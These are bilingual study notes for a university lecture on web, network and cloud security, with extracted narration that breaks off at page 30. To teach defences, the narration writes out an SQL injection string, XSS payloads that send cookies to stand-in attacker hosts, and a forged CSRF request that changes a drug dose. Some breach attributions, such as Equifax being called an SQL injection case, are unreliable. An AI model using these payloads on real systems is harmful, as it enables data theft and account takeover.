# SEHS5052 Lecture 4 — Web, network and cloud security

Web、网络与云安全

Source: SEHS5052-Lecture 04 - With Notes.pdf

English narration is extracted page by page. Bilingual notes are study summaries, not a complete literal translation. Source-page snapshots and unverified slide OCR are available on the website.

## PDF 1–2: Three-layer overview / 三层安全概览

This lecture connects web input, network protocols, cloud identity and platform configuration across three security layers.

本讲覆盖Web、网络和云安全。学习时把应用输入、通信协议、身份与平台配置作为相互关联的防护对象。

## PDF 3–4: Web security goals / Web安全目标

Web forms, logins and comments create exposure. Relate each interaction to confidentiality, integrity, availability and identity assurance.

用户与应用通过Web交互，输入框、登录与评论功能都可能带来风险。分析功能如何影响保密性、完整性、可用性及身份信任。

## PDF 5–6: Input and interpreters / 输入与解释器

Applications need input, but databases and browsers interpret syntax. Keep untrusted input as data rather than executable structure.

正常功能需要接收输入，但数据库和浏览器会解释特定语法。安全处理必须保持输入是数据，不能让它改变程序结构。

## PDF 7–8: OWASP and CWE / OWASP与CWE

OWASP risk categories and CWE weakness classifications guide review. Rankings belong to the version used by the lecture, not a permanent current order.

OWASP风险类别与CWE弱点分类帮助组织检查。讲义所用排名属于其引用版本，不能作为永远不变的当前排名。

## PDF 9–10: SQL injection impact / SQL注入影响

Unsafe SQL concatenation can enable unauthorized reads, changes or authentication bypass. Focus on the cause and prevention rather than unverified historical statistics.

不安全拼接SQL可能导致越权读取、修改或认证绕过。讲义的历史案例与统计只作来源记录；记忆重点是漏洞根因与防护。

## PDF 11–12: Separate code and data / 代码与数据分离

Injection changes query logic and may expose data directly or indirectly. Use bound parameters and restrict database-account privileges.

注入改变原查询的逻辑；不同变体可能直接返回结果，也可能通过间接反应推断数据。使用参数绑定，并限制数据库账户权限。

## PDF 13–14: Cross-site scripting / XSS

XSS executes untrusted script in a site's browser context. It can manipulate pages or steal data; cookie access also depends on protections such as HttpOnly.

XSS使不可信脚本在用户浏览器的站点上下文中执行。风险包括页面操作和信息窃取；可读Cookie范围还受HttpOnly等机制影响。

## PDF 15–16: Reflected and stored XSS / 反射与存储型XSS

Reflected XSS returns input in a response; stored XSS persists it for later visitors. Apply context-appropriate encoding and safe HTML sanitization where needed.

反射型通过一次请求把内容返回页面；存储型先保存内容，再影响访问该页面的用户。防护要在输出位置正确编码，必要时安全净化HTML。

## PDF 17–18: Cross-site request forgery / CSRF

CSRF induces unintended authenticated requests. Validate anti-CSRF tokens and request origins, with suitable cookie policies.

攻击诱导已登录用户的浏览器发送非本人意愿的操作请求。服务器应检查防伪令牌和请求来源，并配合适当Cookie策略。

## PDF 19–20: Layered web controls / 多层Web控制

Client checks improve usability; server validation remains necessary. Combine parameterization, encoding, security headers and WAF controls.

客户端检查改善体验，服务端必须重新验证。再配合参数化、输出编码、安全响应头与WAF，避免把一种工具当作完整解决方案。

## PDF 21–22: Defensive uploads / 防御性上传

Validate upload type, size and resource use, isolate storage and serve correct content types. Do not trust client-supplied declarations alone.

文件上传应检查类型、大小与资源消耗，隔离存储并正确设置响应类型。任何来自客户端的声明都不能直接当成可信事实。

## PDF 23–24: Allowlisting and canonicalization / 允许列表与规范化

Allowlist types, lengths and ranges where appropriate, and validate a canonical form. Free text still needs safe query and output handling.

对格式明确的字段规定允许的类型、长度与范围；规范化后再检查。自由文本和姓名需兼顾正常语言需求，验证不能替代安全SQL与输出处理。

## PDF 25–26: Parameterized queries / 参数化查询

Define SQL structure and bind values separately. Dynamic identifiers and query structure still require controlled design rather than raw concatenation.

先定义SQL结构，再绑定数据值，避免把用户输入拼接为SQL。动态表名、排序字段等不能直接按普通参数处理，仍需受控设计。

## PDF 27–28: Context-aware encoding / 按上下文编码

HTML, attribute, URL and JavaScript contexts need different handling. Use safe templates and APIs instead of assuming HTML escaping works everywhere.

HTML、属性、URL和JavaScript上下文的处理规则不同。使用安全模板与接口，避免把HTML转义当作所有位置的通用防护。

## PDF 29–30: Secure lifecycle / 安全开发生命周期

Model threats during planning, code securely, test weaknesses, and monitor and patch after release. Security spans the full lifecycle.

规划时分析威胁，编码时遵守规范，测试时检查漏洞，上线后监测与修补依赖。安全贯穿全过程，不只是发布前一次检查。

## PDF 31–32: Web review / Web复习

Review validation, parameterized queries, contextual encoding, CSRF protection and secure development. Explain which problem each addresses.

串联五项措施：验证输入、参数化查询、上下文编码、CSRF防护和持续安全开发。能说明每项主要针对什么问题。

## PDF 33–34: Network security / 网络安全入口

Application controls do not replace network protection. Sniffing, spoofing and denial of service affect different, sometimes overlapping security goals.

应用安全不能替代通信安全。窃听影响保密性，冒充破坏来源信任，拒绝服务影响可用性；分析时注意影响可能重叠。

## PDF 35–36: Trust in protocols / 协议中的信任

Base networking does not provide every authentication or confidentiality property. Add secure protocols, filtering and verification rather than trusting addresses alone.

基础网络协议并非为所有敌对环境提供完整认证与保密。通过额外安全协议、过滤和验证补足保护，不凭地址直接信任发送者。

## PDF 37–38: Network threat categories / 三类网络威胁

Sniffing observes traffic, spoofing falsifies origin, and DoS exhausts resources. Match encryption, origin checks and resilience to these threats.

窃听观察通信；地址冒充伪造来源；拒绝服务耗尽资源。分别考虑加密、来源验证与可用性控制。

## PDF 39–40: Limiting sniffing / 防止窃听

Encryption protects content and segmentation reduces exposure. Switched networks do not replace authenticated secure communication.

加密使截获者难以读取内容，分段限制暴露范围。交换网络降低无关流量可见性，但不能替代端到端安全验证。

## PDF 41–42: IP spoofing / 地址冒充

Source IPs can be forged and replies normally follow the forged address. Ingress and egress filtering help; an IP is not an identity credential.

源IP字段可能被伪造，回包通常送往伪造地址。入口和出口过滤减少不合理来源，不应把IP地址当作身份凭据。

## PDF 43–44: TCP handshake / TCP握手

TCP uses SYN, SYN-ACK and ACK. Half-open state while awaiting completion can be abused; understand when resources are allocated.

SYN、SYN-ACK、ACK建立TCP连接。服务器等待最终确认时的半开状态可能被滥用，理解状态分配是理解SYN洪泛的关键。

## PDF 45–46: SYN flooding / SYN洪泛

Incomplete handshakes can exhaust connection state. SYN cookies reduce that pressure without removing all processing or bandwidth costs.

大量未完成握手占用连接状态，阻碍正常用户。SYN cookies减少半开状态压力，但不能消除所有处理或带宽成本。

## PDF 47–48: DDoS / 分布式拒绝服务

Distributed sources complicate simple blocking. Combine upstream cooperation, mitigation services, rate controls and capacity planning.

多来源协同流量使单点封禁不足。结合分布式缓解、上游协作、限流和容量设计，优先保障关键业务可用性。

## PDF 49–50: Reflection and amplification / 反射与放大

Reflection sends third-party responses to a victim; amplification increases response volume. Restrict exposed services and combine source validation with upstream mitigation.

反射让第三方回应受害目标，放大让回应大于请求。限制公开服务、校验来源和上游缓解可减少被滥用机会与影响。

## PDF 51–52: Network mitigations / 网络缓解措施

Source filtering, SYN cookies and secure tunnels solve different problems. A secure tunnel alone does not stop every denial-of-service attack.

过滤异常来源，SYN cookies缓解状态耗尽，安全隧道保护通信。不同措施针对不同问题，隧道本身不是抗所有DDoS的办法。

## PDF 53–54: Virtual private network / VPN

A VPN protects a public-network channel using encapsulation, encryption and authentication. Endpoint and access controls remain necessary; other protocols can also encrypt traffic.

VPN在公网建立受保护通道，结合封装、加密与认证。仍需终端、身份和最小权限控制；也不能说没有VPN的所有流量都未加密。

## PDF 55–56: Cloud characteristics / 云的特征

The five cloud characteristics are on-demand self-service, broad network access, resource pooling, rapid elasticity and measured service.

按需自助、广泛网络访问、资源池化、快速弹性与可计量服务是讲义列出的五项云特征。便利和共享也带来配置与隔离责任。

## PDF 57–58: Cloud models / 云服务与部署

Distinguish IaaS, PaaS and SaaS from public, private, hybrid and community deployment. Models change control and responsibility.

区分IaaS、PaaS、SaaS，以及公有、私有、混合和社区云。模型影响控制权和责任，选择需结合数据、运营与业务需求。

## PDF 59–60: Shared responsibility / 共享责任

Provider and customer duties vary by service. Customers retain important identity, access, data and configuration responsibilities.

供应商与客户分担控制，具体边界随服务变化。客户仍需管理身份、访问、数据与配置；不能把迁移到云理解为转移全部安全责任。

## PDF 61–62: Cloud risks / 云风险

The lecture discusses abuse, insecure interfaces, configuration errors, data loss and insiders. Use threat lists as prompts, not substitutes for environment-specific assessment.

讲义讨论资源滥用、不安全接口、配置错误、数据损失及内部人员风险。风险清单用于分析，名称和排名不应替代实际环境评估。

## PDF 63–64: APIs and secrets / API与秘密管理

Protect APIs with authentication, authorization, TLS, rate controls and monitoring. Keep secrets out of source and assess third-party access.

API需要认证、授权、TLS、限流和监测。密钥不应硬编码到源码；第三方依赖也要检查权限、数据访问和事故响应安排。

## PDF 65–65: Exposed-key example / 泄露密钥示例

This example illustrates public-repository secret exposure. Review authorized code and revoke or rotate exposed credentials; do not use others' leaked keys.

本页以公开仓库泄露密钥为警示。复习重点是扫描自己授权范围的代码并撤销、轮换泄露凭据，不使用第三方泄露密钥。

## PDF 66–67: Insider risk / 内部人员风险

Customer or provider insiders can act maliciously or negligently. Limit impact using least privilege, temporary access, separation of duties and audit.

客户或供应商内部人员可能滥用权限，也可能因疏忽造成暴露。最小权限、临时提权、职责分离与审计共同限制影响。

## PDF 68–69: Identity and access management / IAM

Manage identity lifecycles, authenticate users and authorize actions separately. MFA reduces credential risk but does not grant unlimited permissions.

身份管理维护账户生命周期；认证验证身份；授权决定可执行操作。MFA降低凭据被盗风险，但授权仍需逐项限制。

## PDF 70–71: Multi-tenancy / 多租户

Shared infrastructure improves efficiency but needs isolation, patching and quotas to limit cross-tenant impact, side channels and contention.

共享基础设施提高利用率，也需防止跨租户影响、侧信道和资源争用。通过隔离、补丁、配额及风险评估选择部署方式。

## PDF 72–73: Three data states / 数据的三种状态

Data at rest, in transit and in use need different protections: key management, TLS, access controls, data-flow monitoring and suitable confidential computing.

存储中、传输中、使用中的数据面临不同风险。分别考虑密钥管理、TLS、访问控制、数据流监测及适用的机密计算方案。

## PDF 74–75: Cloud review / 云安全复习

Clarify responsibilities, restrict APIs and identities, protect keys and data, and monitor continuously. Choose controls based on actual risks.

明确责任边界，限制API与身份权限，保护密钥和数据，持续记录与监测。控制选择应由具体风险驱动。

## PDF 76–76: Closing page / 结束页

This page has no extractable notes.

本页无可提取讲稿。

## PDF 77–77: Case tutorial / 案例练习

Use the case tutorial to map threats, affected assets, controls and residual risk across web, network and cloud layers.

通过Web、网络与云的案例练习，把威胁、受影响资产、控制措施和残余风险对应起来。

## Original source — PDF page 1

[No extractable narration; see source image.]

## Original source — PDF page 2

Table of 
Contents

Part A: Web Security

• SQL Injection, Cross-Site Scripting

(XSS), CSRF
• OWASP Top 10
• Secure web development

practices
Part B: Network Security

• Network layer threats (spoofing,

sniffing, DoS)
• TCP/IP security issues
• VPNs and secure communication
Part C: Cloud Security

• Shared responsibility model
• Cloud-specific threats

(misconfiguration, insider threats)
• Identity and access management

in cloud
• Data protection in multi-tenant

environments

Week 4: Multi-Layer Security - Web, Network & Cloud Security

## Original source — PDF page 3

Welcome to Lecture 4, where we shift from theoretical frameworks to practical implementation. Today we'll explore 
three attack surfaces: the web layer (where users interact), the network layer (where data travels), and the cloud layer 
(where data is stored and processed). Part A focuses on web security, which is critical because the web is the primary 
interface between your organization and the outside world. Every input field on a hospital patient portal, every login 
form, every comment box is a potential entry point for attackers. The five pillars shown—Confidentiality, Integrity, 
Authenticity, Availability, and Accountability—represent what we're defending.

In a healthcare context, think about a hospital's patient portal. Confidentiality means patient data isn't exposed to 
unauthorized users. Integrity means medication orders can't be tampered with. Authenticity means we verify the 
user is really who they claim to be (not an impostor). Availability means the portal works when patients need 
it. Accountability means we can prove who accessed what and when (audit trails). A breach in ANY of these pillars is a 
security failure.

The theme of this lecture is "trust and betrayal." The web operates on trust: we trust user input to be benign, we trust

## Original source — PDF page 4

browsers to execute code safely, we trust databases to store data securely. But attackers exploit that trust by injecting 
malicious input that betrays our assumptions. By the end of Part A, you'll understand the three most dangerous web 
vulnerabilities—SQL Injection, Cross-Site Scripting, and CSRF—and how to defend against them systematically.

## Original source — PDF page 5

Here's the fundamental tension in web security: The modern web REQUIRES user input (search queries, login 
credentials, comments, form submissions), but every input field is a potential attack vector. The diagram shows the 
ﬂow: User Input → ApplicaƟon → Browser (data in moƟon) → Database (data at rest). At each stage, if we don't 
validate and sanitize input properly, attackers can inject malicious code that compromises confidentiality, integrity, or 
availability.

Let's make this concrete with a hospital example. A patient portal has a search box: "Find my appointment." Normal 
input: "Dr. Smith." Malicious input: ' OR 1=1 --. The attacker isn't searching for an appointment—they're trying to trick 
the database into returning ALL patient records. The application takes the input, builds a database query, and if it's not 
properly protected, the malicious input becomes executable code. This is SQL Injection, and it's the #3 vulnerability on 
the OWASP Top 10 (we'll cover this in detail soon).

The key insight: Input is data, but it can become code if we're not careful. The browser interprets HTML and 
JavaScript. The database interprets SQL. If we let user input flow directly into these interpreters without validation,

## Original source — PDF page 6

we've given attackers control. This slide sets up the core conflict we'll spend the rest of Part A solving: How do we accept input 
(necessary for functionality) while preventing code injection (necessary for security)?

## Original source — PDF page 7

This radar chart shows the current threat landscape based on two authoritative sources: OWASP Top 10 (the most 
critical web application security risks) and CWE Top 25 (Common Weakness Enumeration from MITRE). The two 
highlighted in orange—Broken Access Control (OWASP #1) and Injection (OWASP #3)—are the most prevalent and 
dangerous. Let's contextualize these: Broken Access Control means a nurse who should only see her department's 
patients can access the entire hospital database. Injection means an attacker can execute arbitrary commands in your 
database or browser.

The other vulnerabilities are also critical: Identification and Authentication Failures (weak passwords, no 
MFA), Vulnerable Components (using outdated libraries with known exploits), Insecure Design (fundamentally flawed 
architecture), Cryptographic Failures (storing passwords in plaintext), and Security Misconfiguration (leaving debug 
mode enabled in production, exposing error messages). Each represents a different failure mode, but they all stem 
from the same root cause: assumptions about trust that attackers exploit.

Why does this matter for your career? If you're auditing a hospital's security, this is your checklist. Start with #1

## Original source — PDF page 8

(Broken Access Control) and work down. If you're building a health analytics platform, these are the vulnerabilities you must
systematically prevent. The OWASP Top 10 isn't just a list—it's a prioritized action plan based on real-world frequency and 
impact. By the end of today, you'll have concrete strategies to mitigate the top three.

## Original source — PDF page 9

SQL Injection is the art of tricking the database into executing unintended commands. The statistic is staggering: one 
single website received 94,057 SQL injection attempts in ONE day. That's not 94K different attackers—it's automated 
tools continuously probing for vulnerabilities. If your hospital's patient portal has a SQL injection flaw, it WILL be found 
and exploited. The attack mechanism is simple: (1) Terminate the text string the application expects, then (2) Append 
a new malicious command. The database doesn't know the difference between legitimate SQL written by developers 
and attacker-injected SQL—it executes both.

Let's walk through a concrete example. A hospital search feature: "Enter patient name to view records." The developer 
writes: SELECT * FROM patients WHERE name = 'USER_INPUT'. Normal use: User enters "Alice" → Query 
becomes SELECT * FROM patients WHERE name = 'Alice' → Returns Alice's record. But an aƩacker enters: ' OR 1=1 --. 
The query becomes: SELECT * FROM patients WHERE name = '' OR 1=1 --'. The OR 1=1 is a tautology (always true), so 
the database returns EVERY patient record. The -- comments out the rest of the query, preventing syntax errors. The 
attacker just stole the entire patient database with 11 keystrokes.

## Original source — PDF page 10

The implications are severe: Data Breach (all patient records stolen, HIPAA violation, millions in fines), Data 
Tampering (attacker can modify medication dosages, allergy records—patient harm), Authentication Bypass (attacker can log 
in as admin without a password). This isn't theoretical—SQL injection was used in the 2015 TalkTalk breach (157K customer 
records stolen), the 2017 Equifax breach (143M people), and countless healthcare breaches. If your system has SQL injection 
vulnerabilities, you're not compliant with HIPAA, GDPR, or any modern security standard.

## Original source — PDF page 11

Let's dissect exactly how SQL Injection works so you can recognize and prevent it. The table shows the transformation 
from Intended Query to Injected Query. Normal query: SELECT info FROM users WHERE name = 'Bob' → Returns 
Bob's information. Injected query: SELECT info FROM users WHERE name = '' OR 1=1 --' → Let's break this down 
character by character. The attacker's input is ' OR 1=1 --. The first single quote (') terminates the string the application 
expects. Now the database thinks the WHERE name = '' condition is complete. Next, OR 1=1 adds a new condition 
that's always true (a tautology). Every row in the database satisfies 1=1. Finally, -- is the SQL comment character—it 
tells the database to ignore everything after it (including the trailing quote the application added).

Why does this work? Because the application uses string concatenation to build the query: query = "SELECT info 
FROM users WHERE name = '" + user_input + "'";. The developer assumed user_input would be a simple name like 
"Bob." But the attacker provided executable SQL code disguised as input. The database can't distinguish between the 
developer's intended SQL and the attacker's injected SQL—it's all just text that gets executed. The result: The 
database dumps the entire table instead of returning one user's record.

## Original source — PDF page 12

This attack pattern has many variations: Union-based SQLi (append a UNION SELECT to extract data from other tables), Blind 
SQLi (ask yes/no questions to infer database structure when output isn't visible), Time-based SQLi (use database sleep 
functions to determine if injection succeeded), Second-order SQLi (inject malicious data that's executed later). The core 
principle is the same: Code and data are mixed, and the database can't tell them apart. The fix (which we'll cover shortly) is 
to separate code from data using parameterized queries.

## Original source — PDF page 13

If SQL Injection betrays the database, Cross-Site Scripting (XSS) betrays the browser. The key difference: In SQL 
Injection, the server is the victim (database compromised). In XSS, the user is the victim (browser compromised), and 
the server is the accomplice (it unknowingly delivers the malicious payload). XSS occurs when an attacker injects 
malicious JavaScript into a webpage, and that JavaScript executes in the victim's browser with full access to cookies, 
session tokens, and sensitive data. The browser trusts the webpage (it came from a legitimate hospital site), so it 
executes the attacker's code without question.

Here's the mechanism: A hospital has a patient forum where users can post comments. The attacker 
posts: <script>alert(document.cookie)</script>. When another user (say, a nurse) views the forum, the server 
retrieves the comment from the database and displays it on the page. The nurse's browser sees <script> tags and 
thinks: "This is JavaScript I should execute." It runs the code, which steals the nurse's cookies (including her session 
token) and sends them to the attacker's server. Now the attacker can impersonate the nurse and access patient 
records. The nurse sees a harmless-looking comment, but behind the scenes, her credentials have been stolen.

## Original source — PDF page 14

Why is this dangerous? Because session cookies are authentication. If an attacker steals your session cookie, they can bypass 
login entirely—the server thinks the attacker IS you. In a hospital context, this means: Reading patient records, modifying 
prescriptions, accessing financial data. Real-world example: In 2018, British Airways suffered an XSS attack via a third-party 
script that harvested 380K credit card details. XSS isn't just annoying pop-ups—it's a full compromise of user trust. And 
because the malicious code runs in the user's browser, traditional network defenses (firewalls, IDS) don't see it.

## Original source — PDF page 15

There are two main types of XSS, each with different mechanics and impact. Reflected XSS (also called non-persistent 
XSS): The attacker crafts a malicious URL containing JavaScript, tricks the victim into clicking it (via phishing email or 
malicious link), and the server reflects the payload back to the victim. Example: A hospital search feature. 
URL: https://hospital.com/search?query=<script>alert(document.cookie)</script>. The server takes 
the query parameter and displays it: "No results found for <script>alert(document.cookie)</script>". The browser 
executes the script, and the attacker's code runs. Reflected XSS requires social engineering—the attacker must trick 
the victim into clicking a malicious link. It's called "reflected" because the payload bounces off the server and back to 
the victim.

Stored XSS (also called persistent XSS) is more dangerous. The attacker injects malicious JavaScript into the database 
(via a comment, profile description, forum post), and every user who views that content becomes a victim. Example: 
Hospital patient forum. Attacker posts 
comment: <script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>. This 
comment is stored in the database. When a nurse views the forum, the server retrieves the comment and displays it.

## Original source — PDF page 16

The nurse's browser executes the script, which redirects to the attacker's site and sends the nurse's cookies. The attacker now 
has the nurse's session token. Stored XSS affects all users and doesn't require tricking anyone—just visiting the page triggers 
the attack.

The example payload shown (document.location='http://hacker.site/cookie.cgi?'+document.cookie) is a classic cookie-
stealing script. It redirects the victim's browser to the attacker's server, appending the victim's cookies to the URL. The 
attacker's server logs the cookies, and now the attacker can impersonate the victim. Defense preview: We'll prevent XSS 
using output encoding—converting <script> into &lt;script&gt; so the browser displays it as text instead of executing it.

## Original source — PDF page 17

Cross-Site Request Forgery (CSRF) is the silent betrayal that exploits the trust chain between server, user, and browser. 
Here's the trust chain: (1) Server trusts the User (via authentication—you logged in with username/password), (2) 
User trusts the Browser (you assume the browser only makes requests you intended), (3) CSRF exploits this chain to 
make the browser send requests you never intended, but the server thinks you did because you're authenticated. Let 
me illustrate with a hospital example: A nurse is logged into the hospital EHR system (session cookie stored in 
browser). She opens another browser tab and visits a malicious website (maybe a phishing link, maybe a compromised 
ad). That website contains hidden code: <img
src="https://hospital.com/change_dosage?patient=12345&drug=morphine&amount=100mg">. The browser 
automatically sends this request to the hospital (including the nurse's session cookie because browsers attach cookies 
to all requests to that domain). The hospital server sees an authenticated request from the nurse and processes it—
changing the patient's morphine dosage to a potentially lethal amount. The nurse never clicked "submit" or even saw 
the form. The attack happened silently in the background.

CSRF works because browsers automatically include cookies in all requests to a domain. If you're logged

## Original source — PDF page 18

into hospital.com, every request your browser makes to hospital.com (even from a different tab or website) includes your 
session cookie. Attackers exploit this by tricking your browser into making requests you didn't intend. Common CSRF attack 
vectors: (1) Malicious images (<img src="malicious_request">), (2) Hidden forms that auto-submit, (3) Compromised third-
party scripts, (4) Malicious links in emails.

The real-world impact: CSRF can trigger financial transactions (transfer money, change account settings), modify critical data 
(patient records, configurations), perform privileged actions (create admin accounts, delete data). In 2007, Gmail had a CSRF
vulnerability that allowed attackers to steal email filters. In 2018, a CSRF flaw in a major router allowed attackers to change 
DNS settings, redirecting users to phishing sites. Defense preview: We'll prevent CSRF using anti-CSRF tokens—unique, 
unpredictable values that the server requires for state-changing requests. Since the attacker can't predict the token, they can't 
forge valid requests.

## Original source — PDF page 19

Now let's step back and ask: Why do these vulnerabilities exist? The root cause is insecure interaction between 
components—specifically, raw input directly influencing program flow without validation. Look at the diagram: User 
Interface → API Gateway → Input ValidaƟon → Core Logic → Database. The vulnerability is when raw input bypasses 
validation and goes straight to core logic or the database. The word "ASSUMPTIONS" is crossed out because the flaw 
is assuming input is safe when it's not. Developers assume users will enter names, not SQL code. They assume 
comments will be text, not JavaScript. They assume requests come from the user interface, not from attacker-
controlled sites. Attackers exploit these assumptions.

The Security Risk Model table is instructive. Two dimensions: Layering (Shallow = few defensive layers, Deep = many 
defensive layers) and Attack Surface (Small = few entry points, Large = many entry points). The safest configuration 
is Deep Layering + Small Attack Surface (Low Risk). The most dangerous is Shallow Layering + Large Attack 
Surface (High Risk). A hospital patient portal with 50 input fields (Large Attack Surface) and no input validation 
(Shallow Layering) is a disaster waiting to happen. Conversely, a portal with 5 input fields (Small Attack Surface) and 
multiple validation layers (Deep Layering) is much more secure.

## Original source — PDF page 20

This is why defense-in-depth matters. You don't rely on a single validation check. You layer defenses: (1) Client-side validation 
(reject obviously bad input early), (2) Server-side validation (never trust the client), (3) Parameterized queries (treat data as 
data, not code), (4) Output encoding (sanitize before displaying to browser), (5) Security headers (Content Security Policy, X-
Frame-Options), (6) WAF (Web Application Firewall) to catch attacks in transit. If one layer fails, others catch the attack. Tell 
students: "Security is not a single 'if' statement checking input—it's multiple layers, each independently verifying 
assumptions."

## Original source — PDF page 21

12
Defensive programming isn't paranoia—it's professionalism. You're designing for an adversarial environment where attackers

actively try to break your assumptions.

The solution to insecure interaction is Defensive Programming—the practice of designing software to continue 
functioning correctly even under attack. The golden rule is simple but profound: "Never Assume." Don't assume input 
is well-formed. Don't assume the user is benign. Don't assume network requests come from your UI. Don't assume 
the environment is secure. Every assumption is a potential vulnerability. Instead, verify everything explicitly.

The three mandates of defensive programming: (1) Check all assumptions—If you assume input is a number, validate 
it's actually a number (not SQL code disguised as a number). If you assume a file upload is an image, verify it's not an 
executable. If you assume a request came from your UI, check the anti-CSRF token. (2) Handle every error—Don't let 
exceptions crash the application or leak stack traces (which help attackers understand your system). Catch errors 
gracefully, log them securely, and return safe error messages to users. (3) Fail gracefully—If validation fails, reject the 
input but keep the application running. Don't expose internal details, don't enter an inconsistent state, and don't make 
exceptions that "just this once" we'll allow invalid input. Security failures often happen when developers say "This 
input looks weird, but let's process it anyway and see what happens.“

## Original source — PDF page 22

A hospital example: A patient uploads a profile picture. Defensive programming checklist: (1) Check file type (is it really an 
image?), (2) Check file size (not a 10GB bomb), (3) Check content (scan for malware), (4) Check resolution (not a 
100,000×100,000 pixel image that crashes the server), (5) Store in a non-executable location, (6) Serve with proper Content-
Type headers. If ANY check fails, reject the upload and log the attempt.

Defensive programming isn't paranoia—it's professionalism. You're designing for an adversarial environment where 
attackers actively try to break your assumptions.

## Original source — PDF page 23

Input validation is the first line of defense against injection attacks. There are two approaches: Allowlisting (only 
accept known good input) and Denylisting (try to block known bad input). Allowlisting is stronger because the 
universe of "good" is smaller and well-defined, whereas the universe of "bad" is infinite and constantly evolving. Let 
me illustrate: Suppose a hospital form asks for a patient's age. Allowlisting: Accept only integers between 0 and 120. 
Denylisting: Reject SQL keywords (SELECT, UNION, DROP), reject special characters (', ;, --), reject JavaScript (<script>). 
Which is better? Allowlisting, because even if an attacker finds a clever way to bypass your denylist, they still can't 
inject non-numeric characters.

Canonicalization is critical. This means transforming input to a standard representation before checking it. Example: 
An attacker submits <sCrIpT> hoping to bypass a filter that looks for <script>. Canonicalization converts it to lowercase 
first: <script>, then the filter catches it. Another example: URL encoding. An attacker submits %3Cscript%3E (URL-
encoded <script>). Canonicalization decodes it first, then validates. Attackers use many evasion techniques—double 
encoding, Unicode variations, null bytes—so you must normalize input to a canonical form before validation.

## Original source — PDF page 24

Practical implementation in a hospital patient portal: (1) Name field: Allowlist only letters, spaces, hyphens, apostrophes (for 
names like "O'Brien"). Reject everything else. (2) Email field: Allowlist characters matching email regex. Reject SQL 
metacharacters (', ;, --). (3) Search field: Allowlist alphanumeric characters. Escape special characters before passing to 
database. (4) Date field: Allowlist ISO 8601 format (YYYY-MM-DD). Reject everything else. Tell students: "Allowlisting is always 
preferred, but when you can't enumerate all valid inputs (like free-text comments), combine denylisting with output 
encoding."

## Original source — PDF page 25

14
If you take one thing from today's lecture, it's this: ALWAYS use parameterized queries. Never concatenate user input into SQL

strings. This single practice eliminates the #3 OWASP vulnerability entirely.

The definitive cure for SQL Injection is parameterized queries (also called prepared statements). The core 
principle: Separate code from data. Instead of building SQL queries by concatenating strings (which mixes code and 
data), you define the query structure first (code), then insert data into placeholders (data). Let's compare: Unsafe 
(String Concatenation): $query = "SELECT * FROM table WHERE id = " . $input;. If $input is 1 OR 1=1, the query 
becomes SELECT * FROM table WHERE id = 1 OR 1=1, which returns all rows. The attacker's input (OR 1=1) became 
executable code.

Safe (Parameterized Query): SELECT * FROM table WHERE id = ?. The ? is a placeholder. You then bind the input 
value: stmt.bind(1, $input). If $input is 1 OR 1=1, the database treats the ENTIRE string 1 OR 1=1 as a literal value for 
the id field. The query tries to find a row where id = "1 OR 1=1" (a nonsensical value), finds nothing, and returns zero 
rows. The attacker's input is treated as text data, never as executable SQL. The database's query parser never 
interprets the input as code—it's always data.

How does this work internally? Parameterized queries use database-level protections. When you prepare a

## Original source — PDF page 26

statement, the database compiles the query structure (including placeholders) BEFORE seeing the data. When you bind 
parameters, the database inserts the values into the pre-compiled structure using type-safe mechanisms (string escaping, 
binary encoding). There's no opportunity for the input to alter the query structure. This is why parameterized queries are 
considered 100% effective against SQL Injection (assuming they're used correctly and consistently).

If you take one thing from today's lecture, it's this: ALWAYS use parameterized queries. Never concatenate user input into 
SQL strings. This single practice eliminates the #3 OWASP vulnerability entirely.

## Original source — PDF page 27

15
Output encoding is your last line of defense. Even if input validation fails and malicious code reaches your database, output

encoding prevents it from executing in users' browsers.

The cure for Cross-Site Scripting is output encoding (also called HTML escaping). The principle: Convert special 
characters to their HTML entity equivalents before displaying user-generated content. This way, the browser displays 
the text safely without executing it as code. The transformation is simple: <script> becomes &lt;script&gt;. The 
browser sees &lt; and renders it as the literal character < instead of interpreting it as the start of an HTML tag. So if an 
attacker injects <script>alert('XSS')</script>, the browser displays the text "<script>alert('XSS')</script>" on the 
page—visible to the user but not executed.

The core HTML entities you must encode: (1) < →&lt;, (2) > →&gt;, (3) " →&quot;, (4) ' →&#x27;, (5) & →&amp;. 
These five characters are the building blocks of HTML tags and JavaScript injection. By encoding them, you prevent the 
browser from interpreting user input as markup or script. Most modern web frameworks have built-in functions for 
this: htmlspecialchars() in PHP, escapeHtml() in Java, escape() in Python, encodeForHTML() in OWASP ESAPI. Always 
use these functions when displaying user-generated content.

Context-aware encoding is critical. There are different contexts where user input might appear: (1) HTML

## Original source — PDF page 28

context: <div>USER_INPUT</div> → Use HTML enƟty encoding. (2) JavaScript context: <script>var name = 
"USER_INPUT";</script> → Use JavaScript escaping (backslash special characters). (3) URL context: <a 
href="USER_INPUT"> → Use URL encoding. (4) CSS context: <style>USER_INPUT</style> → Use CSS encoding. Using the 
wrong encoding for the context can still leave you vulnerable. Example: HTML encoding doesn't protect JavaScript context. An 
attacker could inject "; alert('XSS'); " and break out of the JavaScript string.

Output encoding is your last line of defense. Even if input validation fails and malicious code reaches your database, output
encoding prevents it from executing in users' browsers.

## Original source — PDF page 29

16
Security isn't a checkpoint before release. It's a continuous discipline integrated into the entire development lifecycle.

The Secure Development Lifecycle (SDL) is a philosophy: Integrate security at every stage of development, not as an 
afterthought. The diagram shows a conƟnuous cycle: Plan → Code → Test → Maintain, all enclosed within "Security 
Integration." This means security isn't a separate phase—it's woven into every activity. The three goals: (1) Stop 
vulnerabilities before they occur (design secure architectures, train developers, use secure coding standards), (2) Find 
vulnerabilities early (automated testing, code review, penetration testing), (3) Reduce impact via resilient 
architecture (defense-in-depth, least privilege, fail-safe defaults).

Let's walk through the cycle for a hospital patient portal: (1) Plan—Threat model the system using STRIDE (from 
Lecture 3). Identify attack surfaces (login form, search field, file upload). Define security requirements (all data 
encrypted in transit, parameterized queries, output encoding). (2) Code—Developers use secure coding practices 
(input validation, parameterized queries, output encoding). Code review tools (like SonarQube) automatically scan for 
vulnerabilities (hardcoded passwords, SQL concatenation). (3) Test—Automated security testing (SAST—Static 
Application Security Testing scans source code, DAST—Dynamic Application Security Testing tests running application). 
Penetration testing by security team. (4) Maintain—Monitor for vulnerabilities in third-party libraries (like Log4j).

## Original source — PDF page 30

Apply security patches. Re-test after changes. Cycle back to Plan.

Why does this matter? Because vulnerabilities found in production are 30x more expensive to fix than vulnerabilities found 
during design. If you discover SQL Injection during planning, you design with parameterized queries from day one. If you 
